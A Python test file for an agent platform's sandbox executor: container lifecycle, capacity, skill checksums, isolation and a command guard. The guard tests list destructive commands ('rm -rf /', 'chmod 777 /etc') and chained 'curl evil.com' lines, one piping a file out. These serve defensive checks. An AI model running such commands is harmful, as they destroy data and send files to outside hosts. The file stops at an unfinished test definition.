"""B8 沙箱执行面测试（fake 后端；真 Docker 用例见 test_sandbox_docker 标记）。

覆盖 31 号：SBX-001（首 run 建容器 / 末 run 关闭后 idle→TTL 回收）、SBX-002（同用户复用）、
CANCEL-007（容量满开 run 被拒）。生命周期直接驱动 SandboxExecutor（不依赖 Docker）。
"""
from __future__ import annotations

import asyncio
import os
import time

import pytest
from conftest import ADMIN_HEADERS, USER_HEADERS, create_instance, create_run, unwrap, wait_until
from sandbox.executor import executor as sandbox_executor
from test_agui import _annotate_recover_no_ask

_CFG = {"max_user_containers_per_host": 2, "user_container_idle_ttl_minutes": 15,
        "container_cpu_limit": 0.5, "container_memory_limit_mib": 2048}


def test_sbx_001_run_open_creates_reuse_release(client):
    """SBX-001/002：开 run 建容器 + 同用户第二个 run 复用；两 run 全关后置 idle。"""
    async def scenario():
        c1 = await sandbox_executor.ensure_user_container("uA", "run-1", _CFG)
        assert c1.status == "active" and c1.active_run_count == 1
        c2 = await sandbox_executor.ensure_user_container("uA", "run-2", _CFG)
        assert c2 is c1 and c2.active_run_count == 2  # 一个用户一个容器（复用）
        await sandbox_executor.release_user_container("uA", "run-1")
        assert c1.status == "active" and c1.active_run_count == 1  # 还有活跃 run，常驻
        await sandbox_executor.release_user_container("uA", "run-2")
        assert c1.status == "idle" and c1.active_run_count == 0  # 末个 run 关闭 → idle
        assert sandbox_executor.get("uA") is not None  # idle 期仍占名额（TTL 内可复用）
        await sandbox_executor.close_all()

    asyncio.run(scenario())


def test_sbx_002_capacity_full_rejects_new_session(client):
    """CANCEL-007：容器数达上限时，新用户开 run 被拒 SANDBOX_CAPACITY_FULL；未到 TTL 的 idle 不被抢占。"""
    from domain.errors import ApiError, Err

    async def scenario():
        await sandbox_executor.ensure_user_container("u1", "r1", _CFG)
        await sandbox_executor.ensure_user_container("u2", "r2", _CFG)  # 满（max=2）
        with pytest.raises(ApiError) as ei:
            await sandbox_executor.ensure_user_container("u3", "r3", _CFG)
        assert ei.value.code == Err.SANDBOX_CAPACITY_FULL and ei.value.status == 429
        # u1 关闭 → idle 但未到 TTL：strict_ttl 下不提前回收，u3 仍被拒
        await sandbox_executor.release_user_container("u1", "r1")
        with pytest.raises(ApiError):
            await sandbox_executor.ensure_user_container("u3", "r3", _CFG)
        # idle TTL=0 → 立即可回收腾位，u3 成功
        c = await sandbox_executor.ensure_user_container("u3", "r3", {**_CFG, "user_container_idle_ttl_minutes": 0})
        assert c.status == "active"
        await sandbox_executor.close_all()

    asyncio.run(scenario())


def test_skill_007_entrypoint_executes_in_container(client):
    """SKILL-007：脚本型 Skill 的 entrypoint 在容器内执行，回结构化 output.json + stdout。"""
    from domain.skill_package import package_checksum

    async def scenario():
        await sandbox_executor.ensure_user_container("uS", "r1", _CFG)
        files = {"run.py": b"import json;print('inspect done');open('output.json','w').write(json.dumps({'status':'success','findings':3}))"}
        res = await sandbox_executor.run_skill(
            "uS", task_id="t1", tool_call_id="tc1", entrypoint="python3 run.py",
            files=files, expected_checksum=package_checksum(files))  # 绑文件名的 checksum（B8-OBS-001）
        assert res.status == "success" and res.exit_code == 0
        assert "inspect done" in res.stdout
        assert res.result_json == {"status": "success", "findings": 3}
        await sandbox_executor.close_all()

    asyncio.run(scenario())


def test_skill_009_agent_loop_drives_bound_skill(client, runtime_backend, monkeypatch):
    """C1：run_platform_skill 接进 agent 循环——编排器/agentscope 驱动平台 Skill「inspection」经真 ZIP
    投递（Skill Hub mock 可执行包）+ 容器内执行，产生 skill.call.succeeded 审计（双 runtime）。"""
    monkeypatch.setenv("OPENOPS_DEMO_SANDBOX_STEP", "1")
    _annotate_recover_no_ask(client)
    instance = create_instance(client)
    run = create_run(client, instance["instance_id"])
    unwrap(client.post(
        f"/api/openops/v1/agent-runs/{run['agent_run_id']}/tasks", headers=USER_HEADERS,
        json={"client_request_id": f"t{time.time_ns()}", "input_text": "跑一次巡检 Skill"},
    ))
    wait_until(lambda: unwrap(client.get(f"/api/openops/v1/agent-runs/{run['agent_run_id']}/state",
                                         headers=USER_HEADERS))["active_task"]["status"] in ("completed", "failed"),
               timeout=10.0)
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run['agent_run_id']}", headers=USER_HEADERS))
    types = [e["event_type"] for e in events]
    assert "openops.skill.call.started" in types and "openops.skill.call.succeeded" in types
    done = next(e for e in events if e["event_type"] == "openops.skill.call.succeeded")
    assert done["payload_redacted_json"]["skill"] == "inspection"
    assert done["payload_redacted_json"]["result"]["status"] == "success"  # 容器内 run.py 写的 output.json


def test_skill_010_unbound_skill_blocked(client):
    """C1：未装配的 Skill fail-closed（skill.call.blocked / TOOL_BLOCKED）。"""
    from runtime.sandbox_skill import run_bound_skill
    from runtime.task_registry import TaskState

    instance = create_instance(client)
    run_row = unwrap(client.post("/api/openops/v1/agent-runs", headers=USER_HEADERS,
                                 json={"client_request_id": "sk_blk", "agent_team_instance_id": instance["instance_id"]}))["run"]
    st = TaskState(task_id="tk", run_id=str(run_row["agent_run_id"]), user_id="0026demo01",
                   instance_id=instance["instance_id"], input_text="x")
    st.available_skills = {"inspection": {"version_no": 2}}  # 只装配 inspection
    run = {"agent_run_id": run_row["agent_run_id"], "audit_trace_id": run_row["audit_trace_id"],
           "agent_team_instance_id": run_row["agent_team_instance_id"]}

    async def scenario():
        txt = await run_bound_skill(st, run, "no_such_skill")
        assert "未在当前实例装配集" in txt and st.tool_blocked is True

    asyncio.run(scenario())
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run_row['agent_run_id']}", headers=USER_HEADERS))
    assert any(e["event_type"] == "openops.skill.call.blocked" for e in events)


def test_skill_003_checksum_mismatch_rejected(client):
    """SKILL-003：包 checksum 不匹配 → SKILL_CHECKSUM_MISMATCH，不执行。"""
    from domain.errors import ApiError, Err

    async def scenario():
        await sandbox_executor.ensure_user_container("uS", "r1", _CFG)
        with pytest.raises(ApiError) as ei:
            await sandbox_executor.run_skill(
                "uS", task_id="t", tool_call_id="tc", entrypoint="python3 run.py",
                files={"run.py": b"print(1)"}, expected_checksum="deadbeef")
        assert ei.value.code == Err.SKILL_CHECKSUM_MISMATCH
        await sandbox_executor.close_all()

    asyncio.run(scenario())


async def test_skill_011_real_download_verifies_zip_bytes_checksum(monkeypatch):
    """C1-CHK-001：real 下载按 **ZIP 原始字节** sha256 校验 `X-Checksum-SHA256`（29.3 §2.5），
    返回给执行面的 checksum 用 package_checksum（两套算法：传输完整性 vs 执行面防篡改，勿混用）。"""
    import hashlib
    import io
    import zipfile

    import httpx

    from domain.skill_package import package_checksum
    from infra.external import skill_hub_client

    src = {"SKILL.md": b"---\nentrypoint: python3 run.py\n---\n# x\n", "run.py": b"print(1)\n"}
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for n, d in src.items():
            z.writestr(n, d)
    zip_bytes = buf.getvalue()

    # 同事确认的 Skill Hub 侧算法（_sha256_file）：对 ZIP 文件字节 64KiB 分块流式 sha256。
    # 分块与一次性等价（sha256 流式不变量）——证明生产代码 hashlib.sha256(r.content) 与之对齐。
    def _sha256_file_bytes(data: bytes) -> str:
        h = hashlib.sha256()
        for i in range(0, len(data), 65536):
            h.update(data[i:i + 65536])
        return h.hexdigest()

    zip_sha = _sha256_file_bytes(zip_bytes)
    assert zip_sha == hashlib.sha256(zip_bytes).hexdigest()  # 分块 == 一次性

    monkeypatch.setenv("OPENOPS_SKILLHUB", "real")
    monkeypatch.setenv("OPENOPS_SKILLHUB_BASE_URL", "http://skillhub.local")

    class _Resp:
        def __init__(self, checksum):
            self.status_code = 200  # raise_with_body 读 status_code/text（换掉 raise_for_status 后）
            self.text = ""
            self.content = zip_bytes
            self.headers = {"X-Checksum-SHA256": checksum}

        def raise_for_status(self):
            pass

    def _client_returning(checksum):
        class _C:
            def __init__(self, *a, **k):
                pass

            async def __aenter__(self):
                return self

            async def __aexit__(self, *a):
                return False

            async def get(self, *a, **k):
                return _Resp(checksum)

        return _C

    # 正确的 ZIP 字节 sha256 → 传输校验通过；返回 checksum = package_checksum（非 ZIP sha）
    monkeypatch.setattr(httpx, "AsyncClient", _client_returning(zip_sha))
    pkg = await skill_hub_client.download_skill_package("inspection", 2)
    assert pkg["entrypoint"] == "python3 run.py"
    assert pkg["checksum"] == package_checksum(pkg["files"]) and pkg["checksum"] != zip_sha

    # 篡改 header（非 ZIP 字节 sha）→ 传输校验失败（旧代码用 package_checksum 比 header 会**永远**失败）
    monkeypatch.setattr(httpx, "AsyncClient", _client_returning("deadbeef"))
    with pytest.raises(RuntimeError, match="传输校验失败"):
        await skill_hub_client.download_skill_package("inspection", 2)


def test_skill_005_timeout_terminated(client):
    """SKILL-005：执行超时 → SKILL_TIMEOUT，进程被终止。"""
    from domain.errors import ApiError, Err

    async def scenario():
        await sandbox_executor.ensure_user_container("uS", "r1", _CFG)
        with pytest.raises(ApiError) as ei:
            await sandbox_executor.run_skill(
                "uS", task_id="t", tool_call_id="tc", entrypoint="sleep 5",
                files={"noop": b""}, timeout=0.3)
        assert ei.value.code == Err.SKILL_TIMEOUT
        await sandbox_executor.close_all()

    asyncio.run(scenario())


def test_bash_004_delete_confined_to_own_container(client):
    """BASH-004：容器内删文件只影响该用户容器（run_command 原语，隔离验证）。"""
    async def scenario():
        await sandbox_executor.ensure_user_container("uA", "ra", _CFG)
        await sandbox_executor.ensure_user_container("uB", "rb", _CFG)
        # uA 在自己容器建文件再删；uB 容器不受影响
        await sandbox_executor.run_command("uA", "echo hi > a.txt && test -f a.txt && echo created")
        rm = await sandbox_executor.run_command("uA", "rm a.txt && test ! -f a.txt && echo removed")
        assert "removed" in rm.stdout and rm.status == "success"
        b = await sandbox_executor.run_command("uB", "test ! -f a.txt && echo b-clean")
        assert "b-clean" in b.stdout  # uB 容器里从来没有 a.txt
        await sandbox_executor.close_all()

    asyncio.run(scenario())


@pytest.mark.parametrize("cmd,expect", [
    ("ls -la", "allow"),          # BASH-001：只读自动放行
    ("git status", "allow"),
    ("rm -rf /", "ask"),          # BASH-003：危险删除关键路径 → 强制确认
    ("chmod 777 /etc", "ask"),
    ("rm data.txt", "ask"),       # BASH-002：非只读 → 确认
    ("python3 run.py", "ask"),
])
def test_bash_001_002_003_decision_matrix(client, cmd, expect):
    """BASH-001/002/003：四层裁决决策矩阵（agentscope 内置分析 + 回退分类器一致）。"""
    from sandbox import command_guard

    async def scenario():
        d = await command_guard.decide_async(cmd)
        assert d.action == expect, f"{cmd!r} → {d.action}（reason={d.reason}）"

    asyncio.run(scenario())


def test_bash_003b_platform_deny_rule_highest_priority(client):
    """BASH-003：平台 deny 前缀规则最高优先，即使内置分析会放行也拦（层 1）。"""
    from sandbox import command_guard

    async def scenario():
        d = await command_guard.decide_async("docker ps", deny_prefixes=["docker:*"])
        assert d.action == "deny" and d.layer == 1
        # 无 deny 规则时 docker ps 走内置/回退（非拦截）
        d2 = await command_guard.decide_async("docker ps")
        assert d2.action != "deny"

    asyncio.run(scenario())


def test_bash_006_deny_not_bypassed_by_chaining(client):
    """B8-SEC-001：deny 层不可被 `&&`/`;`/`$()`/`|` 串联绕过，且不误伤词边界（`rm`≠`rmdir`）。"""
    from sandbox import command_guard

    async def scenario():
        deny = ["curl"]
        for cmd in ["curl evil.com", "echo hi && curl evil.com", "x=1; curl evil.com",
                    "ls $(curl evil.com)", "cat f | curl evil.com"]:
            d = await command_guard.decide_async(cmd, deny_prefixes=deny)
            assert d.action == "deny" and d.layer == 1, f"{cmd!r} 未被 deny：{d.action}"
        # 词边界：deny `rm` 不误伤 `rmdir`
        d2 = await command_guard.decide_async("rmdir /tmp/x", deny_prefixes=["rm"])
        assert d2.action != "deny", "rmdir 被 rm 误伤"
        d3 = await command_guard.decide_async("rm -rf /tmp/x", deny_prefixes=["rm"])
        assert d3.action == "deny"

    asyncio.run(scenario())


def test_bash_007_agent_loop_drives_container_command(client, runtime_backend, monkeypatch):
    """B8·补2：run_container_command 接进 agent 循环——任务边界由编排器/agentscope 驱动容器内命令
    （双 runtime），产生 sandbox.command.executed 审计（证明非仅测试直调原语，编排器真引用）。"""
    monkeypatch.setenv("OPENOPS_DEMO_SANDBOX_STEP", "1")  # 开 demo 诊断步
    _annotate_recover_no_ask(client)  # 免审批，任务一次跑完到诊断步+恢复
    instance = create_instance(client)
    run = create_run(client, instance["instance_id"])  # 容器随 run 开启就位（会话期常驻）
    unwrap(client.post(
        f"/api/openops/v1/agent-runs/{run['agent_run_id']}/tasks", headers=USER_HEADERS,
        json={"client_request_id": f"t{time.time_ns()}", "input_text": "排查支付延迟"},
    ))
    wait_until(lambda: unwrap(client.get(f"/api/openops/v1/agent-runs/{run['agent_run_id']}/state",
                                         headers=USER_HEADERS))["active_task"]["status"] in ("completed", "failed"),
               timeout=10.0)
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run['agent_run_id']}", headers=USER_HEADERS))
    types = [e["event_type"] for e in events]
    assert "openops.sandbox.command.executed" in types  # agent 循环驱动了容器内命令
    cmd_ev = next(e for e in events if e["event_type"] == "openops.sandbox.command.executed")
    assert cmd_ev["payload_redacted_json"]["command"] == "ls -la"


@pytest.mark.skipif(os.getenv("OPENOPS_SANDBOX_DOCKER_TEST") != "1",
                    reason="实机 Docker run_skill E2E：设 OPENOPS_SANDBOX_DOCKER_TEST=1 且本机有 docker + python:3.11-slim 才跑")
def test_docker_real_run_skill_write_exec_isolation(client):
    """B8-SBX-001 回归护栏：真 Docker 后端 run_skill 写盘+执行+output.json+跨用户隔离（实机）。"""
    from sandbox.backends import DockerContainerBackend

    async def scenario():
        be_a = DockerContainerBackend("uA", image="python:3.11-slim", cpu=0.5, mem_mib=512)
        be_b = DockerContainerBackend("uB", image="python:3.11-slim", cpu=0.5, mem_mib=512)
        await be_a.start()
        await be_b.start()
        try:
            # 写盘（只读 rootfs + tmpfs mode=1777 + exec base64 路径）
            payload = b"import json;open('output.json','w').write(json.dumps({'status':'success','n':7}))"
            await be_a.write_file("skills/t/tc/run.py", payload)
            assert await be_a.read_file("skills/t/tc/run.py") == payload  # 读回一致
            r = await be_a.exec_shell(["sh", "-lc", "cd " + be_a.workdir + "/skills/t/tc && python3 run.py && cat output.json"],
                                      timeout=30, max_output_bytes=65536)
            assert r.exit_code == 0 and '"n": 7' in r.stdout
            # 跨用户隔离：uB 看不到 uA 的文件
            rb = await be_b.exec_shell(["sh", "-lc", "test ! -f " + be_b.workdir + "/skills/t/tc/run.py && echo b-clean"],
                                       timeout=15, max_output_bytes=4096)
            assert "b-clean" in rb.stdout
        finally:
            await be_a.close()
            await be_b.close()

    asyncio.run(scenario())


def test_bash_002_ask_approve_reject_and_audit(client):
    """BASH-002：非只读命令走 ask——批准则执行+审计 executed，拒绝则不执行+审计 denied。"""
    from runtime import sandbox_bash
    from runtime.task_registry import TaskState

    instance = create_instance(client)
    run_row = unwrap(client.post("/api/openops/v1/agent-runs", headers=USER_HEADERS,
                                 json={"client_request_id": "bh1", "agent_team_instance_id": instance["instance_id"]}))["run"]
    run = _run_dict(run_row)
    st = TaskState(task_id="tk", run_id=str(run["agent_run_id"]), user_id="0026demo01",
                   instance_id=instance["instance_id"], input_text="x")

    async def scenario():
        # 批准 → 执行
        async def approve():
            return True
        res = await sandbox_bash.run_bash(st, run, "echo hi > f.txt && cat f.txt", cfg={}, approver=approve)
        assert res.status == "success" and "hi" in res.stdout
        # 拒绝 → 不执行
        async def reject():
            return False
        res2 = await sandbox_bash.run_bash(st, run, "rm f.txt", cfg={}, approver=reject)
        assert res2.status == "denied"

    asyncio.run(scenario())
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run['agent_run_id']}", headers=USER_HEADERS))
    types = [e["event_type"] for e in events]
    assert "openops.sandbox.command.asked" in types
    assert "openops.sandbox.command.executed" in types
    assert "openops.sandbox.command.denied" in types


def _run_dict(run_row: dict) -> dict:
    """把 API 返回的 run（str 化）转回 emit 需要的 dict（audit_trace_id/agent_run_id/instance_id）。"""
    return {"agent_run_id": run_row["agent_run_id"], "audit_trace_id": run_row["audit_trace_id"],
            "agent_team_instance_id": run_row["agent_team_instance_id"]}


def test_sbx_003_run_lifecycle_via_api_audits_container(client):
    """端到端：开 run 写 sandbox.container.ready 审计 + 容器就位；关 run 后容器置 idle。"""
    instance = create_instance(client)
    run = create_run(client, instance["instance_id"])
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run['agent_run_id']}", headers=USER_HEADERS))
    assert any(e["event_type"] == "sandbox.container.ready" for e in events)
    # 用户 0026demo01 的容器已就位、active
    c = sandbox_executor.get("0026demo01")
    assert c is not None and c.status == "active" and c.active_run_count == 1

    unwrap(client.post(f"/api/openops/v1/agent-runs/{run['agent_run_id']}:close", headers=USER_HEADERS))
    c2 = sandbox_executor.get("0026demo01")
    assert c2 is not None and c2.status == "idle"  # 末 run 关闭 → idle（TTL>0 未回收）


def test_admin_008_container_list_and_destroy(client):
    """ADMIN-008（B8-4）：管理台列容器（含 active_run_count）+ 强制销毁写审计 + 用户可见事件。"""
    instance = create_instance(client)
    run = create_run(client, instance["instance_id"])
    rows = unwrap(client.get("/api/openops/v1/admin/sandbox/containers", headers=ADMIN_HEADERS))
    mine = next(r for r in rows if r["user_id"] == "0026demo01")
    assert mine["runtime_status"] == "active" and mine["active_run_count"] == 1

    unwrap(client.post("/api/openops/v1/admin/sandbox/containers/0026demo01:destroy", headers=ADMIN_HEADERS,
                       json={"client_request_id": "d1", "reason": "变更冻结演练"}))
    assert sandbox_executor.get("0026demo01") is None  # 容器已回收
    ev = unwrap(client.get(f"/api/openops/v1/audit/runs/{run['agent_run_id']}", headers=USER_HEADERS))
    # 销毁审计走独立 trace（不挂 run trace），但用户可见事件推到其活跃 run 的 SSE 环
    recent = unwrap(client.get("/api/openops/v1/admin/audit/recent", headers=ADMIN_HEADERS))
    assert any(e["event_type"] == "sandbox.container.destroyed" for e in recent)


def test_admin_008b_container_endpoints_forbidden_for_user(client):
    """B8-4：沙箱容器端点普通用户 403。"""
    r1 = client.get("/api/openops/v1/admin/sandbox/containers", headers=USER_HEADERS)
    r2 = client.post("/api/openops/v1/admin/sandbox/containers/x:destroy", headers=USER_HEADERS,
                     json={"client_request_id": "u", "reason": "x"})
    assert r1.status_code == 403 and r2.status_code == 403


def test_skill_012_failure_detail_surfaces(client, monkeypatch):
    """失败根因三通道可见（内网教训：下载类失败曾塌缩成无信息 SKILL_FAILED）：download 抛裸
    RuntimeError → 返回给模型的文本与审计 payload 都带异常类型+文本（raise_with_body 的 body 不再被吞）。"""
    import json as _json

    from infra.external import skill_hub_client
    from runtime.sandbox_skill import run_bound_skill
    from runtime.task_registry import TaskState

    instance = create_instance(client)
    run_row = unwrap(client.post("/api/openops/v1/agent-runs", headers=USER_HEADERS,
                                 json={"client_request_id": "sk_det", "agent_team_instance_id": instance["instance_id"]}))["run"]
    st = TaskState(task_id="tk", run_id=str(run_row["agent_run_id"]), user_id="0026demo01",
                   instance_id=instance["instance_id"], input_text="x")
    st.available_skills = {"alarm-query": {"version_no": 1}}
    run = {"agent_run_id": run_row["agent_run_id"], "audit_trace_id": run_row["audit_trace_id"],
           "agent_team_instance_id": run_row["agent_team_instance_id"]}

    async def boom(_key, _ver):
        raise RuntimeError("console HTTP 401：unauthorized body snippet")

    monkeypatch.setattr(skill_hub_client, "download_skill_package", boom)

    async def scenario():
        txt = await run_bound_skill(st, run, "alarm-query")
        assert "RuntimeError" in txt and "401" in txt  # LLM 可见根因

    asyncio.run(scenario())
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run_row['agent_run_id']}", headers=USER_HEADERS))
    failed = next(e for e in events if e["event_type"] == "openops.skill.call.failed")
    assert "401" in _json.dumps(failed, ensure_ascii=False, default=str)  # 审计/活动栏可见根因


def test_sbx_003_exec_timeout_flags_timed_out(client):
    """FakeBackend 线程池+同步 subprocess.run 实现（换掉 asyncio 子进程 API——Windows SelectorEventLoop
    不支持后者，内网实测 skill 执行抛裸 NotImplementedError）：超时到点自杀 → timed_out=True。"""
    async def scenario():
        await sandbox_executor.ensure_user_container("uT", "r1", _CFG)
        c = sandbox_executor.get("uT")
        assert c is not None
        r = await c.backend.exec_shell(["sh", "-lc", "sleep 5"], timeout=0.5, max_output_bytes=1000)
        assert r.timed_out is True
        await sandbox_executor.close_all()

    asyncio.run(scenario())


def test_sbx_revive_after_process_restart(client):
    """执行边界自愈（内网实测回归）：进程重启丢内存容器注册表后，复用旧 run 的
    skill/bash 执行应按容量准入现场重建容器，而非 SANDBOX_CONTAINER_FAILED。"""
    from domain.errors import ApiError
    from domain.skill_package import package_checksum

    async def scenario():
        await sandbox_executor.ensure_user_container("uR", "run-x", _CFG)
        await sandbox_executor.close_all()  # 模拟后端重启：内存注册表清空，DB 里 run 仍 active
        assert sandbox_executor.get("uR") is None

        files = {"run.py": b"print('revived')"}
        res = await sandbox_executor.run_skill(
            "uR", task_id="t1", tool_call_id="tc1", entrypoint="python3 run.py",
            files=files, expected_checksum=package_checksum(files),
            run_id="run-x", cfg=_CFG)  # 带 run 上下文 → 自愈重建
        assert res.status == "success" and "revived" in res.stdout
        c = sandbox_executor.get("uR")
        assert c is not None and c.status == "active" and "run-x" in c.active_run_ids  # close_run 可对账

        res2 = await sandbox_executor.run_command("uR", "echo hi", run_id="run-x", cfg=_CFG)
        assert res2.status == "success"

        # 无 run/cfg 上下文（老路径）：缺容器仍 fail-closed
        await sandbox_executor.close_all()
        with pytest.raises(ApiError) as ei:
            await sandbox_executor.run_command("uR", "echo hi")
        assert ei.value.code == "SANDBOX_CONTAINER_FAILED"
        await sandbox_executor.close_all()

    asyncio.run(scenario())


def test_def7_bash_tool_entry_revives_after_restart(client):
    """DEF-7：run_container_command 工具入口在容器缺失时自愈重建（旧守卫把自愈短路成死代码）。"""
    from runtime.sandbox_bash import run_container_command
    from runtime.task_registry import TaskState
    from sandbox.executor import executor as sandbox_executor

    instance = create_instance(client)
    run_row = unwrap(client.post("/api/openops/v1/agent-runs", headers=USER_HEADERS,
                                 json={"client_request_id": "def7", "agent_team_instance_id": instance["instance_id"]}))["run"]
    st = TaskState(task_id="tk_def7", run_id=str(run_row["agent_run_id"]), user_id="0026demo01",
                   instance_id=instance["instance_id"], input_text="x")
    st.sandbox_cfg = {}
    run = {"agent_run_id": run_row["agent_run_id"], "audit_trace_id": run_row["audit_trace_id"],
           "agent_team_instance_id": run_row["agent_team_instance_id"],
           "framework_session_id": run_row["framework_session_id"]}

    async def scenario():
        await sandbox_executor.close_all()  # 模拟进程重启/容器回收
        assert sandbox_executor.get("0026demo01") is None
        out = await run_container_command(st, run, "echo revived")
        return out

    out = asyncio.run(scenario())
    assert "revived" in out and "容器不可用" not in out  # 自愈重建并执行（修复点）


def test_bash_approval_required_payload_carries_args(client):
    """审批卡"批哪个工具的什么入参"：非只读容器命令的 approval.required payload 带 args.command
    （前端 buildApprovalFacts 逐项展示）+ 保留 command 兼容旧前端。"""
    from runtime.sandbox_bash import run_container_command
    from runtime.task_registry import TaskState

    instance = create_instance(client)
    run_row = unwrap(client.post("/api/openops/v1/agent-runs", headers=USER_HEADERS,
                                 json={"client_request_id": "bashargs", "agent_team_instance_id": instance["instance_id"]}))["run"]
    st = TaskState(task_id="tk_bashargs", run_id=str(run_row["agent_run_id"]), user_id="0026demo01",
                   instance_id=instance["instance_id"], input_text="x")
    st.sandbox_cfg = {}
    run = {"agent_run_id": run_row["agent_run_id"], "audit_trace_id": run_row["audit_trace_id"],
           "agent_team_instance_id": run_row["agent_team_instance_id"],
           "framework_session_id": run_row["framework_session_id"]}

    async def scenario():
        async def approver():  # 后台审批者：approval_id 一就位即批准，避免 bridge 卡在 wait
            for _ in range(300):
                if st.approval_id:
                    st.approval_result = "approved"
                    st.approval_ev.set()
                    return
                await asyncio.sleep(0.01)
        approve = asyncio.create_task(approver())
        await run_container_command(st, run, "rm data.txt")  # 非只读 → ASK（BASH-002）
        await approve

    asyncio.run(scenario())
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run_row['agent_run_id']}", headers=USER_HEADERS))
    appr = next(e for e in events if e["event_type"] == "openops.approval.required")
    p = appr["payload_redacted_json"]
    assert p["tool"] == "run_container_command"
    assert p["args"]["command"] == "rm data.txt"  # 通用入参字典（前端逐项展示）
    assert p["command"] == "rm data.txt"           # 兼容旧前端字段保留


def test_skill_013_unzip_strips_single_toplevel_dir():
    """2026-07-14 exit2 实锤修复：zip -r 打包的单顶层目录自动剥掉；混合层级不动；
    无 entrypoint 行但有 run.py 保旧默认（零回归）；均无 → None（手册型信号）。"""
    import io
    import zipfile

    from infra.external.skill_hub_client import _entrypoint_from, _unzip

    def _zip(entries: dict[str, bytes]) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            for name, data in entries.items():
                z.writestr(name, data)
        return buf.getvalue()

    # 单顶层目录 → 剥
    files = _unzip(_zip({"change-query/SKILL.md": b"# m", "change-query/run.py": b"print(1)"}))
    assert set(files) == {"SKILL.md", "run.py"}
    # 混合层级（有文件在根）→ 不动
    files2 = _unzip(_zip({"SKILL.md": b"# m", "lib/util.py": b""}))
    assert set(files2) == {"SKILL.md", "lib/util.py"}
    # entrypoint 解析三态
    assert _entrypoint_from({"SKILL.md": b"entrypoint: bash run.sh", "run.sh": b""}) == "bash run.sh"
    assert _entrypoint_from({"SKILL.md": b"# no entry", "run.py": b""}) == "python3 run.py"  # 保旧默认
    assert _entrypoint_from({"SKILL.md": b"# manual only"}) is None  # 手册型


def test_skill_014_manual_skill_returns_manual_text(client, monkeypatch):
    """手册型 Skill（只有 SKILL.md 无脚本）：不进沙箱，正文返回模型 + skill.call.succeeded(mode=manual)。"""
    from infra.external import skill_hub_client
    from runtime.sandbox_skill import run_bound_skill
    from runtime.task_registry import TaskState

    async def _manual_pkg(_key, _ver):
        return {"files": {"SKILL.md": "# alarm-query 排查手册\n先查告警列表再看详情。".encode()},
                "entrypoint": None, "checksum": "x"}

    monkeypatch.setattr(skill_hub_client, "download_skill_package", _manual_pkg)
    instance = create_instance(client)
    run_row = unwrap(client.post("/api/openops/v1/agent-runs", headers=USER_HEADERS,
                                 json={"client_request_id": "sk_man", "agent_team_instance_id": instance["instance_id"]}))["run"]
    st = TaskState(task_id="tk-man", run_id=str(run_row["agent_run_id"]), user_id="0026demo01",
                   instance_id=instance["instance_id"], input_text="x")
    st.available_skills = {"alarm-query": {"version_no": 1}}
    run = {"agent_run_id": run_row["agent_run_id"], "audit_trace_id": run_row["audit_trace_id"],
           "agent_team_instance_id": run_row["agent_team_instance_id"]}

    async def scenario():
        txt = await run_bound_skill(st, run, "alarm-query")
        assert "手册型技能" in txt and "排查手册" in txt
        assert st.tool_blocked is False  # 手册装载=成功，不是拦截

    asyncio.run(scenario())
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run_row['agent_run_id']}", headers=USER_HEADERS))
    ok = [e for e in events if e["event_type"] == "openops.skill.call.succeeded"]
    # 审计出口有 payload 白名单投影（活动栏批次）：mode 键被剥，按可观测契约断言 summary
    assert ok and "手册已装载" in str(ok[0]["payload_redacted_json"].get("summary", ""))


def test_skill_015_entrypoint_missing_structured_error(client, monkeypatch):
    """脚本型但 entrypoint 指的脚本不在包内：SKILL_PACKAGE_INVALID 结构化报错，不再是 python exit 2。"""
    from infra.external import skill_hub_client
    from runtime.sandbox_skill import run_bound_skill
    from runtime.task_registry import TaskState

    async def _broken_pkg(_key, _ver):
        return {"files": {"SKILL.md": b"entrypoint: python3 run.py"},  # 声明了脚本但包里没有
                "entrypoint": "python3 run.py", "checksum": "x"}

    monkeypatch.setattr(skill_hub_client, "download_skill_package", _broken_pkg)
    instance = create_instance(client)
    run_row = unwrap(client.post("/api/openops/v1/agent-runs", headers=USER_HEADERS,
                                 json={"client_request_id": "sk_brk", "agent_team_instance_id": instance["instance_id"]}))["run"]
    st = TaskState(task_id="tk-brk", run_id=str(run_row["agent_run_id"]), user_id="0026demo01",
                   instance_id=instance["instance_id"], input_text="x")
    st.available_skills = {"change-query": {"version_no": 1}}
    run = {"agent_run_id": run_row["agent_run_id"], "audit_trace_id": run_row["audit_trace_id"],
           "agent_team_instance_id": run_row["agent_team_instance_id"]}

    async def scenario():
        txt = await run_bound_skill(st, run, "change-query")
        assert "SKILL_PACKAGE_INVALID" in txt

    asyncio.run(scenario())
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run_row['agent_run_id']}", headers=USER_HEADERS))
    fails = [e for e in events if e["event_type"] == "openops.skill.call.failed"]
    assert fails and fails[0]["reason_code"] == "SKILL_PACKAGE_INVALID"


# ────────────────── docker 档产品化批（2026-07-15）──────────────────

def test_build_container_config_shape():
    """安全基线核心断言（纯函数，不碰真 docker）：镜像/网络/pids/资源限额/非 root/只读 rootfs/labels。"""
    from sandbox.backends import LABEL_MANAGED, LABEL_SCOPE, LABEL_USER, build_container_config

    cfg = build_container_config(user_id="u1", image="openops-sandbox:v9", cpu=0.5, mem_mib=512,
                                 network_mode="none", pids_limit=128)
    h = cfg["HostConfig"]
    assert cfg["Image"] == "openops-sandbox:v9"
    assert h["NetworkMode"] == "none" and h["PidsLimit"] == 128
    assert h["Memory"] == 512 * 1024 * 1024 and h["NanoCpus"] == int(0.5 * 1e9)
    assert cfg["User"] == "1000:1000" and cfg["Env"] == []
    assert h["CapDrop"] == ["ALL"] and h["ReadonlyRootfs"] is True
    assert "no-new-privileges=true" in h["SecurityOpt"]
    assert set(h["Tmpfs"]) == {"/openops/workspace", "/tmp"}
    assert cfg["Labels"][LABEL_MANAGED] == "1" and cfg["Labels"][LABEL_USER] == "u1" and LABEL_SCOPE in cfg["Labels"]


def test_cfg_resolution_defaults_and_coercion():
